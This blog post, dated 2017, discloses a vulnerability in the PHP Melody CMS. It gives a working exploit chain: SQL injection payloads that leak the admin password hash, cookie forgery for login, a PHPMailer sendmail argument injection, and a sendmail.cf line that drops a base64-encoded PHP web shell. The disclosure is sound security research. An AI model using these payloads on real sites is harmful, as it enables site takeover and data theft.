---
layout: post
title:  PHP Melody - Multiple Vulnerabilities
date:   2017-01-20 00:00:00
categories: [phpmelody, security, exploit, sql, injection, vulnerability]
coverimage: /img/posts/flower-macro.jpg
covertitle: Flower Macro, by [George Hodan](http://www.facebook.com/hodanpictures?ref=hl)
---

What's interesting when I come across a new piece of software are how the initial impressions change made after reading the code. If you're looking to setup a new YouTube&reg; style website PHP Melody ranks highly for many search terms, it's convincingly marketed and looks polished even to an expert eye.

But what about their claim: **Secure code with 5 years of time-proven reliability**. I wouldn't be so sure about that claim considering the list of exploits below and the general theme of this post!

 * [2015 - PHP Melody v2.3 - SQL Injection](https://packetstormsecurity.com/files/135079/PHP-Melody-CMS-2.3-SQL-Injection.html)
 * [2013 - PHP Melody v1.9 - XSRF](https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/1308-exploits/phpmelody-xsrf.txt)
 * [2009 - PHP Melody v1.5.3 - Arbitrary File Upload Injection](https://www.exploit-db.com/exploits/9239/)

When we audit the source code for an application it's fairly easy to get a feel of how it's been developed, what the potential weak points are going to be, and sometimes it takes just a few minutes to come to the conclusion that there will be an exploit even if it hasn't been found yet. In the industry we call this 'code smell'.

One thing we look at is consistency and the likelyhood for a developer to make mistakes when using the different code patterns or techniques, having worked as a developer for a significant chunk of time the PHP Melody code base instantly struck a chord - it's a consistent mess of potential pitfalls, general bad practices and high chances that security slip-ups will be made.


## SQL Injection and Inconsistency

SQL queries are littered throughout the code, sure it may be spaghetti, but the problem is how the SQL queries are made; it looks like something taken directly from a 'Learn PHP in 24 hours' book: lots of string concatenation, variables and a variety of differently applied functions to prepare the raw user data for inclusion into the SQL query.

When dealing with this type of code it's only a matter of time and analysis before we find one instance where the developer failed to follow the magic and slightly irrational sequence of steps needed to prevent their users from getting owned, and in `comment.php` we found one such occurrence:

```php
//  if (!$logged_in) { ...
	$ip = secure_sql(pm_get_ip());
	$user = trim($_POST['username']);
	$user = $emoji_client->toShort($user); // convert unicode to shortname
	$user = strip_tags($user);
	$user = specialchars($user, 1);
	$user = secure_sql($user);
	$user_id = $_POST['user_id'];
//  }

	$added = time();
	// ** PREP THE COMMENT FOR MYSQL OR REMOVE IT IF IT'S SPAM ** //
	$comment = trim($_POST['comment_txt']);
	$comment = $emoji_client->toShort($comment); // convert unicode to shortname
	$comment = nl2br($comment);
	$comment = removeEvilTags($comment);

// ...

	if ($comment != '')
	{
		$sql = "INSERT INTO pm_comments SET uniq_id = '".$vid."', username = '".$user."', comment = '".secure_sql($comment)."', user_ip = '".$ip."', added = '".$added."', user_id = '".$user_id."'";
```

At this point we could have directed [sqlmap](http://sqlmap.org/) at it and let it do its thing, but while the default out-of-the-box install of PHP Melody does allow anonymous comments there is a CAPTCHA, not to mention the last thing we want to do is spam a video with thousands of comments containing SQL injection tests.

Another tool which could have helped detect this vulnerability and reduced the amount of analysis time it took to discoverer is [Phuzz](https://github.com/HarryR/phuzz), an automatic taint-style tracing fuzzer for PHP which highlights where user input is passed to sensitive functions or system calls, however it's still in the early stages of development and doesn't yet allow you to analyse traces from normal web browsing.


## Leveraging the Initial Vulnerability

So, you've found a SQL injection bug and want to get the most out of it, you can't use `sqlmap` because of a CAPTCHA, what's the best or worst thing you can do with SQL injection in an `INSERT` statement?

```sql
INSERT INTO pm_comments
   SET uniq_id = 'ac0266df0', username = 'admin', comment = 'derp', user_ip = '127.0.0.1', added = 1483497600, user_id = '1'
```

The `SET` syntax doesn't allow for the `comment` field to be specified multiple times, but by using the `ON DUPLICATE KEY UPDATE` query syntax and setting the `id` to that of an existing comment then fields can be overridden with arbitrary data.

```sql
INSERT INTO pm_comments
   SET uniq_id = 'ac0266df0', username = 'admin', comment = 'derp', user_ip = '127.0.0.1', added = 1483497600, user_id = '1'
   , id = 1, approved = 1, report_count = 0
   ON DUPLICATE KEY UPDATE comment = CONCAT(comment, '<script>alert(1);</script>'),
   	user_ip = '127.0.0.1';
```

There are two options which come to mind that can work within the limitations of the `INSERT` statement:

 * Append JavaScript to the most popular comment
 * Retrieve data from the database using a sub-select

Both of these are useful, but the second turned out to be a much easier way of achieving the aim of elevating privileges to take-over the site and gain full access so its administration panel and user database.


## Authentication, Security and More Fail

Knowing that anything can be read from the database provides a read primitive, but the CAPTCHA makes it tedious to automate and very slow to retrieve large amounts of data from the site. Instead we are going to attack the authentication mechanisms which allow persistent login via cookies, or 'Remember Me'.

PHP Melody uses two cookies for the auto-login functionality:

 * `melody_XXX` - Username
 * `melody_key_XXX` - Login-key

Where `XXX` is an `MD5` hash of the base URL of the site from `settings.php`, and the login-key is an `MD5` hash of the `password` column from the users table. So even though the `password` column is an `MD5` hash of the password, knowing that alone allows us to login as that user even though the underlying password isnt known.

Using the SQL injection and a subselect this information can be included at the end of the existing comment without displaying on the site:

```sql
INSERT INTO pm_comments SET uniq_id = 'ac0266df0', username = 'admin', comment = 'derp', user_ip = '127.0.0.1', added = 1483497600, user_id = '1'
, id = 1, approved = 1, report_count = 0
ON DUPLICATE KEY UPDATE comment = CONCAT(comment,
	'<!-- PASSWD ',
	(SELECT CONCAT(username, ' - ', password) FROM pm_users WHERE power = '1' LIMIT 1),
	' -->'),
	user_ip = '127.0.0.1';
```

For a moment we're going to overlook the fact that modern password storage guidelines are completely overlooked, a single round of `MD5` without any cryptographic salt should be considered broken and almost as bad as plaintext; that and the rest of the code makes it seem like their development team is stuck in about 2004 and haven't learned much since.

## Admin to Shell

Surprisingly the code for the administration section, despite drowning in even more SQL injection, wasn't directly vulnerable to code execution or arbitrary file upload bugs, instead we rely on the go-to method for code execution for late 2016 and early 2017: PHPMailer and `mail()`.

PHPMailer v5.2.13 is used to send all e-mail, but to trigger the `mail()` command injection bug it's necessary to set the `From:` address which isn't usually isn't possible as an anonymous user.

The `admin-ajax.php` file contains a function called `testmail` which allows you to control all parameters except for the body and the subject, the code for sending the e-mail is:

```php
switch ($action)
{
	case 'testmail':
		
		extract($_POST);

		// *snip*/		
	
		$mail = new PHPMailer();
		$mail->setLanguage('en', ABSPATH .'/include/phpmailer/language/');
	
		if ($mail_smtp == '1')
		{
			$mail->IsSMTP();
		}
	
		$mail->Subject = 'Test email from '. _SITENAME;
		$mail->Host 	= $mail_server;
		$mail->SMTPAuth = true;
		$mail->Port 	= $mail_port;
		$mail->Username = $mail_user;
		$mail->Password = $mail_pass;
		$mail->setFrom($contact_email, html_entity_decode(_SITENAME, ENT_QUOTES));
		$mail->CharSet = "UTF-8";
		$mail->AddAddress($contact_email);
		$mail->IsHTML(false);
```

Exploits for PHPMailer ([CVE-2016-10033](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html) and [CVE-2016-10045](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html)) allow command-line arguments to be given to `sendmail` after bypassing escaping and validation in the `From:` address. Two arguments which can be used for exploitation are:

 * `-X` - Write log to arbitrary file, including the Subject and message body
 * `-OAliasFile` - Read aliases from an arbitrary file, perform commands on receipt of a message
 * `-C` - Read Sendmail configuration from an arbitrary file

The PHPMailer proof-of-concepts rely on controlling the message body to insert PHP code into an arbitrary web accessible file, but to use this in PHP Melody we would have to override the `_SITENAME` variable (configured via 'Site title') - however, stuffing a snippet of PHP code into the title of every page is a dead giveaway as an indicator of compromise even if it's only temporary.

A more novel option for exploitation is possible by uploading a sendmail configuration file instead of an image, the `upload_image.php` admin utility isn't susceptable to any interesting bugs, but it doesn't validate the contents of the file and can be used as such:

```
curl -H 'Cookie: melody_..=admin; melody_key_...=...;' \
	-F doing=X \
	-FFilename=x.jpg -FFiledata='@sendmail.cf;type=application/octet-stream' \
	http://localhost/admin/upload_image.php
```

This will give you the URL of a .jpg file in the `uploads/articles` directory, then by visiting `/admin/sys_phpinfo.php` the full path for that file is known and can be included in the exploit string:

```
"x\" -oQ/tmp -C/var/www/uploads/articles/d473ef85.jpg x"@localhost
```

Another problem encountered which could stop any attempts to exploit this bug is the e-mail address is limited in length by the form validation, so if the full path to the uploaded file is too long it will display an error message.

## Sendmail and Beyond

Now, the fun bit is writing a sendmail configuration file, if you've never encountered this beast before I recommend finding a local Occult bookshop and reading up on human sacrifices and ways to sway evil forces in your favour, the raw configuration format is pedantic and esoteric to say the least.

Deep within the Sendmail man pages and documentation there's an interesting configuration directive which can execute arbitrary commands on startup, for a while I was concerned that I'd have to write a full `sendmail.cf` file from scratch.

The `Fx|/path/to/exe` syntax will load class definitions by executing a program, unfortunately while you can pass multiple arguments by quoting them you can't pass arguments with spaces which means `sh -c` is out of the question. Thankfully PHP can run code from the command-line and doesn't need whitespace.

A two-line `sendmail.cf` file I ended up with is:

```
V10/Berkeley
Fhax|"/usr/bin/env php -r file_put_contents('/var/www/html/uploads/articles/exploit.php',base64_decode('PD9waHAgZXZhbCgkX0dFVFsneCddKTsK'));"
```

This dumps a basic PHP web-shell into `/var/www/html/uploads/articles/exploit.php`, the arbitrary sized base64 encoded payload could be changed to drop a [Weevely3](https://github.com/epinna/weevely3) agent, or `eval` code instead.

If the target is using Postfix, Qmail or a lightweight `sendmail` alternative the `-X` technique will still work, but the site-name will need to be overridden with a PHP backdoor...


## Summary and Recommendations

What can we do to prevent this from happening in future? Realistically the developers of PHP Melody will just patch that specific instance of SQL injection and move on while leaving the **Secure code with 5 years of time-proven reliability** claim on their website.

Unless the developers of PHP Melody change their development practices and/or re-code the software using industry standard patterns and frameworks which prevent a wide range of security holes from existing in the first place then the likelyhood of more vulnerabilities being discovered in future is fairly high.

What about the people who rely on this software? Deploying a Web Application Firewall, even something free and open-source like mod_security with a good rule-set could provide adequate defence against the initial SQL injection vulnerability.

**[OWASP Top 10](https://www.owasp.org/index.php/Top_10_2013-Top_10)**

 * A1 - Injection
 * A6 - Sensitive Data Exposure
 * A9 - Using Components with Known Vulnerabilities
 
**Overall CVSS Score: 9.8**

